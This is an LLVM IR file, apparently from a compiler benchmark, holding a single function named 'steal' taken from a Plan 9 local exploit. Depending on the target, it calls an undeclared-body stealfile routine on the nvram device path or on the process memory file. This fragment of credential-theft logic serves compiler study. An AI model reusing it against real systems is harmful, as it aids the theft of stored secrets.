; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/plan9/local/extr_3383.c_steal.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/plan9/local/extr_3383.c_steal.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@target = common dso_local global i64 0, align 8
@Tnvram = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [14 x i8] c"#S/sdC0/nvram\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"#p/%d/mem\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 ()* @steal to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @steal() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [32 x i8], align 16
  %3 = load i64, i64* @target, align 8
  %4 = load i64, i64* @Tnvram, align 8
  %5 = icmp eq i64 %3, %4
  br i1 %5, label %6, label %8

6:                                                ; preds = %0
  %7 = call i32 @stealfile(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  store i32 %7, i32* %1, align 4
  br label %14

8:                                                ; preds = %0
  %9 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %10 = call i32 (...) @getpid()
  %11 = call i32 @snprint(i8* %9, i32 32, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i32 %10)
  %12 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %13 = call i32 @stealfile(i8* %12)
  store i32 %13, i32* %1, align 4
  br label %14

14:                                               ; preds = %8, %6
  %15 = load i32, i32* %1, align 4
  ret i32 %15
}

declare dso_local i32 @stealfile(i8*) #1

declare dso_local i32 @snprint(i8*, i32, i8*, i32) #1

declare dso_local i32 @getpid(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
